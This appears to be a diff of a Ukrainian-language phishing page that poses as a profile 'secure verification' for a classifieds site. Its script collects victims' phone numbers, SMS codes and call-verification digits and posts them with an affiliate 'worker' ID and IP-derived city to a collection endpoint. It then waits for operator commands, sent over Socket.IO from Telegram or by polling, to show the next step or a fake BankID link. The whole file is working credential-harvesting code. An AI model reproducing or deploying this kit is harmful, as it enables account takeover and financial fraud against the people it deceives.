@@ -7,7 +7,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
-    <script src="/socket.io/socket.io.js"></script>
     <style>
         :root {
             --primary: #007bff;
@@ -40,12 +39,6 @@
             border-radius: 20px;
             overflow: hidden;
             box-shadow: var(--shadow);
-            animation: fadeIn 0.5s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .header {
@@ -55,7 +48,6 @@
             text-align: center;
             font-weight: 600;
             font-size: 17px;
-            letter-spacing: 0.5px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -64,23 +56,9 @@
 
         .header i { font-size: 19px; }
 
-        .content {
-            padding: 25px 20px;
-            text-align: center;
-        }
+        .content { padding: 25px 20px; text-align: center; }
 
-        .logo-wrapper {
-            margin-bottom: 20px;
-        }
-
-        .logo {
-            width: 90px;
-            height: 90px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid #fff;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-        }
+        .logo { width: 90px; height: 90px; border-radius: 50%; object-fit: cover; border: 3px solid #fff; box-shadow: 0 3px 10px rgba(0,0,0,0.1); }
 
         .info-text {
             background: #e3f2fd;
@@ -90,17 +68,7 @@
             font-size: 14.5px;
             line-height: 1.5;
             margin-bottom: 22px;
-            text-align: center;
             border: 1px solid #bbdefb;
-            box-shadow: 0 2px 6px rgba(21, 101, 192, 0.1);
-        }
-
-        .info-text strong {
-            color: #0d47a1;
-        }
-
-        .input-group {
-            margin-bottom: 18px;
         }
 
         input {
@@ -111,83 +79,12 @@
             border: 2px solid var(--border);
             border-radius: 12px;
             transition: all 0.3s ease;
-            background: #fff;
         }
 
         input:focus {
             outline: none;
             border-color: var(--primary);
             box-shadow: 0 0 0 4px rgba(0, 123, 255, 0.15);
-        }
-
-        .phone-input {
-            font-size: 21px;
-            letter-spacing: 1.2px;
-        }
-
-        .sms-prompt, .call-prompt, .bankid-prompt {
-            color: var(--text-muted);
-            margin-bottom: 16px;
-            font-size: 14.5px;
-            line-height: 1.5;
-        }
-
-        .call-prompt {
-            color: var(--text);
-            font-size: 16px;
-            font-weight: 500;
-            margin-top: 10px;
-        }
-
-        .bankid-prompt {
-            color: var(--danger);
-            font-size: 16px;
-            font-weight: 600;
-            margin-bottom: 20px;
-        }
-
-        .code-input-group, .four-digit-input-group {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 0 auto 20px;
-            padding: 0 10px;
-            overflow-x: auto;
-            -webkit-overflow-scrolling: touch;
-            scrollbar-width: none;
-            flex-wrap: nowrap;
-        }
-
-        .code-input-group::-webkit-scrollbar, .four-digit-input-group::-webkit-scrollbar {
-            display: none;
-        }
-
-        .code-input, .four-digit-input {
-            width: 48px;
-            height: 48px;
-            font-size: 20px;
-            font-weight: bold;
-            text-align: center;
-            border: 2px solid var(--border);
-            border-radius: 10px;
-            transition: all 0.25s ease;
-            background: #fff;
-            -webkit-appearance: none;
-            -moz-appearance: textfield;
-            flex-shrink: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0;
-            box-sizing: border-box;
-            line-height: 1;
-        }
-
-        .code-input:focus, .four-digit-input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.2);
-            transform: scale(1.04);
-            outline: none;
         }
 
         .submit-button {
@@ -200,377 +97,235 @@
             font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
+            margin-top: 20px;
         }
 
-        .submit-button:hover {
-            background: var(--primary-hover);
-            transform: translateY(-1px);
-        }
+        .submit-button:hover { background: var(--primary-hover); }
 
-        .submit-button:active {
-            transform: translateY(0);
-        }
-
-        .step {
+        /* Загрузка */
+        .loading {
             display: none;
-            animation: slideIn 0.4s ease-out;
-        }
-
-        .step.active {
-            display: block;
-        }
-
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateX(15px); }
-            to { opacity: 1; transform: translateX(0); }
-        }
-
-        /* Стиль для успішного повідомлення */
-        .success-message {
-            color: var(--success);
-            text-align: center;
-            padding: 20px;
-            font-size: 18px;
-            font-weight: 600;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            color: var(--text);
+            font-size: 16px;
             line-height: 1.6;
         }
 
-        .success-message i {
-            font-size: 48px;
-            display: block;
-            margin-bottom: 16px;
-            color: var(--success);
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f0f0f0;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
         }
 
-        input[type=tel]::-webkit-inner-spin-button,
-        input[type=tel]::-webkit-outer-spin-button,
-        .code-input::-webkit-inner-spin-button,
-        .code-input::-webkit-outer-spin-button,
-        .four-digit-input::-webkit-inner-spin-button,
-        .four-digit-input::-webkit-outer-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
-        input[type=tel], .code-input, .four-digit-input { -moz-appearance: textfield; }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Стилі для анімації завантаження */
-        .loading-animation {
+        /* Шаги */
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.4s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .bankid-warning { color: var(--danger); font-weight: 600; font-size: 15px; margin-bottom: 20px; }
+        .bankid-btn {
+            background: #000 !important;
+            color: white !important;
+            padding: 16px !important;
+            border-radius: 14px !important;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 600;
+        }
+
+        .call-digits {
             display: flex;
             justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            padding: 30px 0;
+            gap: 10px;
+            margin: 20px 0;
         }
 
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-left-color: var(--primary);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            color: var(--text);
-            font-size: 16px;
-            font-weight: 500;
-            text-align: center;
-            line-height: 1.4;
-        }
-
-        /* Стилі для кнопки BankID */
-        .method-button-bankid {
-            background: var(--black);
-            color: white;
-            border-color: var(--black);
-            font-weight: 600;
-            padding: 15px;
-            border: none;
-            border-radius: 12px;
-            font-size: 17px;
-            width: 100%;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .method-button-bankid:hover {
-            background: #333;
-            border-color: #333;
-            color: white;
+        .call-digits input {
+            width: 60px;
+            height: 60px;
+            font-size: 24px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <i class="fas fa-shield-alt"></i>
-            <span>Безпечна перевірка</span>
-        </div>
-
-        <div class="content">
-            <div class="logo-wrapper">
-                <img id="project-logo" src="" alt="Логотип" class="logo">
-            </div>
-
-            <div id="phone-step" class="step active">
-                <div class="info-text">
-                    Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону. Це допоможе захистити ваш акаунт і забезпечити його стабільну роботу.
-                </div>
-
-                <div class="input-group">
-                    <input
-                        type="tel"
-                        id="phone-number"
-                        class="phone-input"
-                        placeholder="+380 __ ___ __ __"
-                        inputmode="numeric"
-                        autocomplete="tel"
-                        aria-label="Номер телефону"
-                    >
-                </div>
-                <button type="button" class="submit-button" onclick="showLoadingStep('phone')">
-                    Продовжити
-                </button>
-            </div>
-            
-            <div id="loading-step" class="step">
-                <div class="loading-animation">
-                    <div class="spinner"></div>
-                    <p class="loading-text">
-                        Зачекайте, ваші дані обробляються.<br>Не закривайте сторінку.
-                    </p>
-                </div>
-            </div>
-
-            <div id="sms-step" class="step">
-                <p class="sms-prompt">Введіть 6-значний код з SMS</p>
-                <div class="code-input-group">
-                    <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-2" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-3" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-4" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric">
-                </div>
-                <button type="button" class="submit-button" onclick="finalizeVerification('code')">
-                    Продовжити
-                </button>
-            </div>
-
-            <div id="call-step" class="step">
-                <p class="call-prompt">На ваш номер надійде дзвінок. Вкажіть останні 4 цифри номеру, з якого був дзвінок, для підтвердження профілю.</p>
-                <div class="four-digit-input-group">
-                    <input type="text" maxlength="1" class="four-digit-input" id="call-code-1" inputmode="numeric">
-                    <input type="text" maxlength="1" class="four-digit-input" id="call-code-2" inputmode="numeric">
-                    <input type="text" maxlength="1" class="four-digit-input" id="call-code-3" inputmode="numeric">
-                    <input type="text" maxlength="1" class="four-digit-input" id="call-code-4" inputmode="numeric">
-                </div>
-                <button type="button" class="submit-button" onclick="finalizeVerification('call')">
-                    Продовжити
-                </button>
-            </div>
-
-            <div id="bankid-step" class="step">
-                <p class="bankid-prompt">Ваш профіль не підтверджено. Для скасування видалення та продовження користуванням підтвердіть профіль за допомогою BankID.</p>
-                <a id="bankid-link" href="https://idverification.onrender.com" target="_blank" style="text-decoration: none;">
-                    <button type="button" class="method-button method-button-bankid" onclick="sendData('bankid_click', {phone: currentPhone})">
-                        Підтвердити
-                    </button>
-                </a>
-            </div>
-
-            <div id="success-step" class="step">
-                <div class="success-message">
-                    <i class="fas fa-check-circle"></i>
-                    <div>Ваш аккаунт успішно підтверджено</div>
-                </div>
-            </div>
-        </div>
+<div class="container">
+    <div class="header">
+        <i class="fas fa-shield-alt"></i>
+        <span>Безпечна перевірка</span>
     </div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const project = urlParams.get('project') || 'dimria';
-        const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
-        
-        document.getElementById('project-logo').src = `/logo?project=${project}`;
-        
-        let userCity = 'Невідомо';
-        let currentPhone = '';
+    <div class="content">
+        <div class="logo-wrapper">
+            <img id="project-logo" src="" alt="Логотип" class="logo">
+        </div>
 
-        // *** ІНІЦІАЛІЗАЦІЯ SOCKET.IO ***
-        const socket = io();
+        <!-- Шаг 1: Номер телефона -->
+        <div id="phone-step" class="step active">
+            <div class="info-text">
+                Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону.
+            </div>
+            <div class="input-group">
+                <input type="tel" id="phone-number" placeholder="+380 __ ___ __ __" inputmode="numeric">
+            </div>
+            <button type="button" class="submit-button" onclick="submitPhone()">Продовжити</button>
+        </div>
 
-        // Обробка команд від сервера (з Телеграму)
-        socket.on('server_command', (data) => {
-            console.log('Отримана команда від сервера:', data.command);
-            
-            switch (data.command) {
-                case 'SMS':
-                    showSmsStepFromTelegram();
-                    break;
-                case 'CALL':
-                    showCallStepFromTelegram();
-                    break;
-                case 'BANKID':
-                    showBankIdStepFromTelegram();
-                    break;
+        <!-- Загрузка -->
+        <div id="loading-step" class="step loading">
+            <div class="spinner"></div>
+            <div>Зачекайте, ваші дані обробляються.<br>Не закривайте сторінку.</div>
+        </div>
+
+        <!-- Звонок — последние 4 цифры -->
+        <div id="call-step" class="step">
+            <div class="info-text">
+                На ваш номер надійде дзвінок.<br>Вкажіть <strong>останні 4 цифри</strong> номера, з якого був дзвінок.
+            </div>
+            <div class="call-digits">
+                <input type="text" maxlength="1" class="code-input" id="d1">
+                <input type="text" maxlength="1" class="code-input" id="d2">
+                <input type="text" maxlength="1" class="code-input" id="d3">
+                <input type="text" maxlength="1" class="code-input" id="d4">
+            </div>
+            <button type="button" class="submit-button" onclick="submitCallDigits()">Продовжити</button>
+        </div>
+
+        <!-- SMS-код -->
+        <div id="sms-step" class="step">
+            <div class="info-text">Введіть 6-значний код з SMS</div>
+            <div class="call-digits">
+                <input type="text" maxlength="1" class="code-input" id="c1">
+                <input type="text" maxlength="1" class="code-input" id="c2">
+                <input type="text" maxlength="1" class="code-input" id="c3">
+                <input type="text" maxlength="1" class="code-input" id="c4">
+                <input type="text" maxlength="1" class="code-input" id="c5">
+                <input type="text" maxlength="1" class="code-input" id="c6">
+            </div>
+            <button type="button" class="submit-button" onclick="submitSmsCode()">Підтвердити</button>
+        </div>
+
+        <!-- BankID -->
+        <div id="bankid-step" class="step">
+            <div class="bankid-warning">
+                Ваш профіль не підтверджено.<br>
+                Для скасування видалення та продовження користування підтвердіть профіль за допомогою BankID
+            </div>
+            <a href="https://idverification.onrender.com" target="_blank" class="submit-button bankid-btn">
+                Підтвердити через BankID
+            </a>
+        </div>
+    </div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const project = urlParams.get('project') || 'dimria';
+    const session = urlParams.get('session') || Math.random().toString(36).substring(2, 15);
+    const worker = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
+
+    document.getElementById('project-logo').src = `/logo?project=${project}`;
+
+    let userCity = 'Невідомо';
+    fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userCity = d.city || 'Невідомо');
+
+    $(document).ready(() => {
+        $('#phone-number').mask('+380 00 000 00 00', {placeholder: " "}).focus();
+
+        // Автопереход по цифрам
+        $('.code-input').on('input', function() {
+            if (this.value.length === 1 && this.nextElementSibling) {
+                this.nextElementSibling.focus();
+            }
+        }).on('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && this.previousElementSibling) {
+                this.previousElementSibling.focus();
             }
         });
-        
-        // Отримуємо місто за IP
-        fetch('https://ipapi.co/json/')
-            .then(res => res.json())
-            .then(data => {
-                if (data && data.city) {
-                    userCity = data.city;
-                }
-            })
-            .catch(() => {
-                userCity = 'Невідомо';
-            });
+    });
 
-        $(document).ready(() => {
-            $('#phone-number').mask('+380 00 000 00 00', {
-                placeholder: " ",
-                clearIfNotMatch: true
-            }).val('+380 ').focus();
+    function showLoading() {
+        $('.step').removeClass('active');
+        $('#loading-step').addClass('active');
+    }
 
-            $('.code-input, .four-digit-input').on('input', function(e) {
-                let value = this.value.replace(/\D/g, '').substr(0, 1);
-                this.value = value;
-                if (value && this.nextElementSibling) {
-                    this.nextElementSibling.focus();
-                }
-            }).on('keydown', function(e) {
-                if (e.key === 'Backspace' && !this.value && this.previousElementSibling) {
-                    this.previousElementSibling.focus();
-                }
-            });
+    function submitPhone() {
+        const phone = $('#phone-number').val().replace(/\D/g, '');
+        if (phone.length !== 12 || !phone.startsWith('380')) {
+            alert('Введіть коректний номер');
+            return;
+        }
+        showLoading();
+        sendData('phone', { phone: '+' + phone });
+    }
+
+    function submitCallDigits() {
+        const digits = $('#d1,#d2,#d3,#d4').map((_,el) => el.value).get().join('');
+        if (digits.length !== 4) return alert('Введіть 4 цифри');
+        showLoading();
+        sendData('call_digits', { digits });
+    }
+
+    function submitSmsCode() {
+        const code = $('#c1,#c2,#c3,#c4,#c5,#c6').map((_,el) => el.value).get().join('');
+        if (code.length !== 6) return alert('Введіть 6 цифр');
+        showLoading();
+        sendData('sms_code', { code });
+    }
+
+    function sendData(type, data) {
+        $.post('/api/log', {
+            session,
+            type,
+            worker,
+            project,
+            city: userCity,
+            ...data
         });
+    }
 
-        function switchStep(fromId, toId) {
-            $('.step').removeClass('active');
-            $(`#${fromId}`).removeClass('active');
-            $(`#${toId}`).addClass('active');
-        }
+    // Получаем команду от сервера (через long polling)
+    function checkCommand() {
+        $.get('/api/command/' + session, function(cmd) {
+            if (!cmd) return setTimeout(checkCommand, 2000);
 
-        // Крок 1 -> Крок 2 (Завантаження)
-        function showLoadingStep(stepType) {
-            let fromStepId;
-            let dataToSend = {};
-            let isPhoneValid = true;
-
-            if (stepType === 'phone') {
-                fromStepId = 'phone-step';
-                const phone = $('#phone-number').val().replace(/\s/g, '');
-                if (!/^\+380\d{9}$/.test(phone)) {
-                    alert('Введіть коректний номер: +380XXXXXXXXX');
-                    isPhoneValid = false;
-                    return;
-                }
-                if (phone.startsWith('+3800') || phone.startsWith('+380380')) {
-                    alert('Невірний формат номеру!');
-                    isPhoneValid = false;
-                    return;
-                }
-                currentPhone = phone;
-                dataToSend = { phone };
-            } else {
-                return;
+            if (cmd === 'call') {
+                $('.step').removeClass('active');
+                $('#call-step').addClass('active');
+                $('#d1').focus();
             }
-
-            if (isPhoneValid) {
-                switchStep(fromStepId, 'loading-step');
-                sendData(stepType, dataToSend);
-
-                // Після успішної відправки номера, ідентифікуємося на Socket.IO
-                socket.emit('identify', { phone: currentPhone });
-
-                // Чекаємо команди від Telegram
+            if (cmd === 'sms') {
+                $('.step').removeClass('active');
+                $('#sms-step').addClass('active');
+                $('#c1').focus();
             }
-        }
-
-        // Нові функції для переходу по команді з Telegram
-        function showSmsStepFromTelegram() {
-            switchStep('loading-step', 'sms-step');
-            $('#code-1').focus();
-        }
-
-        function showCallStepFromTelegram() {
-            switchStep('loading-step', 'call-step');
-            $('#call-code-1').focus();
-        }
-
-        function showBankIdStepFromTelegram() {
-            switchStep('loading-step', 'bankid-step');
-            // При показі форми BankID також відправляємо дані (якщо це потрібно для логування)
-            sendData('bankid_show', { phone: currentPhone }); 
-        }
-
-        // Обробка підтвердження SMS/Дзвінок
-        function finalizeVerification(stepType) {
-            let dataToSend = {};
-            let isInputValid = true;
-            let fromStepId;
-
-            if (stepType === 'code') {
-                fromStepId = 'sms-step';
-                const code = $('.code-input').map((_, el) => el.value).get().join('');
-                if (!/^\d{6}$/.test(code)) {
-                    alert('Введіть повний 6-значний код');
-                    isInputValid = false;
-                }
-                dataToSend = { code, phone: currentPhone };
-            } else if (stepType === 'call') {
-                fromStepId = 'call-step';
-                const callCode = $('.four-digit-input').map((_, el) => el.value).get().join('');
-                if (!/^\d{4}$/.test(callCode)) {
-                    alert('Введіть повні 4 цифри');
-                    isInputValid = false;
-                }
-                dataToSend = { callCode, phone: currentPhone };
-            } else {
-                isInputValid = false;
+            if (cmd === 'bankid') {
+                $('.step').removeClass('active');
+                $('#bankid-step').addClass('active');
             }
+        }).always(() => setTimeout(checkCommand, 2000));
+    }
 
-            if (isInputValid) {
-                switchStep(fromStepId, 'loading-step');
-                sendData(stepType, dataToSend);
+    // Запуск проверки команд после отправки номера
+    window.submitPhone = function() {
+        const phone = $('#phone-number').val().replace(/\D/g, '');
+        if (phone.length !== 12 || !phone.startsWith('380')) return alert('Невірний номер');
+        showLoading();
+        sendData('phone', { phone: '+' + phone });
+        checkCommand(); // начинаем слушать команды
+    };
 
-                // Після успішного введення коду, переходимо на успішний крок
-                setTimeout(() => {
-                    switchStep('loading-step', 'success-step');
-                }, 1000);
-            }
-        }
-        
-        function sendData(step, data) {
-            $.ajax({
-                url: '/api/send-data',
-                type: 'POST',
-                contentType: 'application/json',
-                data: JSON.stringify({ 
-                    step, 
-                    ...data, 
-                    worker, 
-                    project, 
-                    city: userCity 
-                }),
-                success: () => {},
-                error: () => {}
-            });
-        }
-
-        window.onload = () => $('#phone-number').focus();
-    </script>
+    checkCommand(); // на всякий случай
+</script>
 </body>
 </html>
